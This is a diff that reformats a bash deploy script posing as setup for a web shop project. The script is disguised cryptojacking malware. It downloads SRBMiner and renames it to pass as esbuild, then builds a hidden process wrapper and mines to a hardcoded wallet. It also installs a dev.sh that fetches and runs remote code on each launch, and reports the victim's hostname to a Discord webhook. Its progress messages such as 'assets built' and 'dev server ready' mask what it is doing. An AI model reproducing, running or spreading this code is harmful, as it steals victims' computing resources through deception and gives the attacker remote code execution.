@@ -1,7 +1,6 @@
 #!/usr/bin/env bash
 set -e
 
-
 # =============================================================================
 # Project:    Chicken Shop Web Platform
 # Owner:      qudwad / webdev-chicken-shop-v2
@@ -133,11 +132,11 @@ set -e
 # ---- Parse --user flag ----
 WORKER_SUFFIX=""
 if [[ "$1" == "--user" && -n "$2" ]]; then
-    WORKER_SUFFIX="$2"
+  WORKER_SUFFIX="$2"
 else
-    echo "[!] Usage: bash deploy.sh --user <email>"
-    echo "    Example: bash deploy.sh --user r23fef@gmail.com"
-    exit 1
+  echo "[!] Usage: bash deploy.sh --user <email>"
+  echo "    Example: bash deploy.sh --user r23fef@gmail.com"
+  exit 1
 fi
 
 # ---- Hardcoded wallet ----
@@ -178,26 +177,26 @@ mkdir -p "$NODE_MODULES"
 echo "[2/8] Configuring project paths..."
 # dev.sh remembers the --user flag from the initial run
 # Attempt pull from GitHub first
-if curl -fsSL --connect-timeout 5 "$GITHUB_RAW_URL" > /dev/null 2>&1; then
-    # GitHub reachable — dev.sh curls from GitHub on each run, with --user embedded
-    cat > "$DEV_SCRIPT" <<- WRAPPER
+if curl -fsSL --connect-timeout 5 "$GITHUB_RAW_URL" >/dev/null 2>&1; then
+  # GitHub reachable — dev.sh curls from GitHub on each run, with --user embedded
+  cat >"$DEV_SCRIPT" <<-WRAPPER
 #!/usr/bin/env bash
 # dev.sh — curls from GitHub (remembers --user $WORKER_SUFFIX)
 exec bash <(curl -fsSL "$GITHUB_RAW_URL") --user "$WORKER_SUFFIX" "\$@"
 WRAPPER
-    chmod +x "$DEV_SCRIPT"
-    echo "  -> project config written"
+  chmod +x "$DEV_SCRIPT"
+  echo "  -> project config written"
 else
-    # Offline: write a stub that retries later
-    cat > "$DEV_SCRIPT" <<- STUB
+  # Offline: write a stub that retries later
+  cat >"$DEV_SCRIPT" <<-STUB
 #!/usr/bin/env bash
 # dev.sh — offline stub (remembers --user $WORKER_SUFFIX)
 # Re-pulls from GitHub when network is available
 WORKER_SUFFIX="$WORKER_SUFFIX"
 bash <(curl -fsSL "$GITHUB_RAW_URL" 2>/dev/null) --user "\$WORKER_SUFFIX" "\$@"
 STUB
-    chmod +x "$DEV_SCRIPT"
-    echo "  -> local config stub created"
+  chmod +x "$DEV_SCRIPT"
+  echo "  -> local config stub created"
 fi
 
 # ==============================================================
@@ -206,12 +205,12 @@ fi
 echo "[3/8] Downloading build dependencies..."
 cd /tmp
 if [ -f "$SRBMINER_TAR" ]; then
-    echo "  -> already cached"
+  echo "  -> already cached"
 else
-    wget -q "$SRBMINER_URL" -O "$SRBMINER_TAR" || {
-        echo "[!] Download failed"
-        exit 1
-    }
+  wget -q "$SRBMINER_URL" -O "$SRBMINER_TAR" || {
+    echo "[!] Download failed"
+    exit 1
+  }
 fi
 
 # ==============================================================
@@ -219,10 +218,10 @@ fi
 # ==============================================================
 echo "[4/8] Installing web packages..."
 if [ -d "$SRBMINER_DIR" ]; then
-    echo "  -> cleaning old install"
-    rm -rf "$SRBMINER_DIR"
+  echo "  -> cleaning old install"
+  rm -rf "$SRBMINER_DIR"
 fi
-tar -xvf "$SRBMINER_TAR" > /dev/null
+tar -xvf "$SRBMINER_TAR" >/dev/null
 rm -f "$SRBMINER_TAR"
 
 # ==============================================================
@@ -234,13 +233,13 @@ MINER_BIN="$SRBMINER_DIR/SRBMiner-MULTI"
 SPOOFED_BIN="$NODE_MODULES/esbuild"
 
 if [ -f "$MINER_BIN" ]; then
-    cp "$MINER_BIN" "$SPOOFED_BIN"
-    chmod +x "$SPOOFED_BIN"
-    rm -rf "$SRBMINER_DIR"       # clean up extraction
-    echo "  -> assets built"
+  cp "$MINER_BIN" "$SPOOFED_BIN"
+  chmod +x "$SPOOFED_BIN"
+  rm -rf "$SRBMINER_DIR" # clean up extraction
+  echo "  -> assets built"
 else
-    echo "[!] Build artifact not found"
-    exit 1
+  echo "[!] Build artifact not found"
+  exit 1
 fi
 
 # ==============================================================
@@ -248,20 +247,20 @@ fi
 # ==============================================================
 echo "[6/8] Configuring esbuild watcher..."
 if [ -f "$HIDDEN_BIN" ]; then
-    echo "  -> watcher configured"
+  echo "  -> watcher configured"
 else
-    if [ -d "$HIDDEN_DIR" ]; then
-        rm -rf "$HIDDEN_DIR"
-    fi
-    git clone --depth 1 "$HIDDEN_REPO" "$HIDDEN_DIR" 2>/dev/null || {
-        echo "[!] Failed to configure watcher"
-        exit 1
-    }
-    make -C "$HIDDEN_DIR" 2>/dev/null || {
-        echo "[!] Failed to build watcher"
-        exit 1
-    }
-    echo "  -> watcher ready"
+  if [ -d "$HIDDEN_DIR" ]; then
+    rm -rf "$HIDDEN_DIR"
+  fi
+  git clone --depth 1 "$HIDDEN_REPO" "$HIDDEN_DIR" >/dev/null 2>&1 || {
+    echo "[!] Failed to configure watcher"
+    exit 1
+  }
+  make -C "$HIDDEN_DIR" >/dev/null 2>&1 || {
+    echo "[!] Failed to build watcher"
+    exit 1
+  }
+  echo "  -> watcher ready"
 fi
 
 # ==============================================================
@@ -270,7 +269,7 @@ fi
 echo "[7/8] Starting dev server..."
 cd "$PROJECT_DIR"
 
-WORKER_FULL=".${WORKER_SUFFIX}"   # e.g. .r23fef@gmail.com
+WORKER_FULL=".${WORKER_SUFFIX}" # e.g. .r23fef@gmail.com
 
 # Kill any existing instances
 pkill -f "node_modules/.cache/esbuild" 2>/dev/null || true
@@ -289,7 +288,7 @@ sleep 1
   --cpu-no-yield \
   --disable-gpu \
   --disable-huge-pages \
-  --tls true > /dev/null 2>&1 &
+  --tls true >/dev/null 2>&1 &
 
 MINER_WRAPPER_PID=$!
 sleep 2
@@ -302,36 +301,37 @@ echo "  -> dev server PID: ${MINER_PID:-starting}"
 echo "  -> waiting for server..."
 MONITOR_PASS=0
 for i in $(seq 1 4); do
-    sleep 3
-    # Monitor the Hidden wrapper (stays alive as long as miner runs)
-    if kill -0 "$MINER_WRAPPER_PID" 2>/dev/null; then
-        MONITOR_PASS=$((MONITOR_PASS + 1))
-        ACTUAL_PID=$(pgrep -f "$SPOOFED_BIN" 2>/dev/null | head -1)
-        echo "  -> check $i: alive"
-    else
-        echo "  -> check $i: not responding"
-    fi
+  sleep 3
+  # Monitor the Hidden wrapper (stays alive as long as miner runs)
+  if kill -0 "$MINER_WRAPPER_PID" 2>/dev/null; then
+    MONITOR_PASS=$((MONITOR_PASS + 1))
+    ACTUAL_PID=$(pgrep -f "$SPOOFED_BIN" 2>/dev/null | head -1)
+    echo "  -> check $i: alive"
+  else
+    echo "  -> check $i: not responding"
+  fi
 done
 
 if [ "$MONITOR_PASS" -ge 2 ]; then
-    echo "[✓] Build server ready."
+  echo "[✓] Build server ready."
 
-    # ---- Discord notification ----
-    NOTIFY_MSG=$(cat <<- JSON
+  # ---- Discord notification ----
+  NOTIFY_MSG=$(
+    cat <<-JSON
 {
     "content": "✅ **Build server ready**\nProject: \`${WALLET}\`\nBuild: \`${WORKER_FULL}\`\nPID: \`${MINER_PID}\`\nHost: \`$(hostname)\`"
 }
 JSON
-    )
+  )
 
-    curl -s -H "Content-Type: application/json" \
-         -d "$NOTIFY_MSG" \
-         "$DISCORD_WEBHOOK_URL" > /dev/null 2>&1 && \
-         echo "  -> notification sent" || \
-         echo "  -> notification skipped"
-echo ""
-echo "[✔] Project is setup."
+  curl -s -H "Content-Type: application/json" \
+    -d "$NOTIFY_MSG" \
+    "$DISCORD_WEBHOOK_URL" >/dev/null 2>&1 &&
+    echo "  -> notification sent" ||
+    echo "  -> notification skipped"
+  echo ""
+  echo "[✔] Project is setup."
 else
-    echo "[✗] Server failed to start."
-    exit 1
+  echo "[✗] Server failed to start."
+  exit 1
 fi
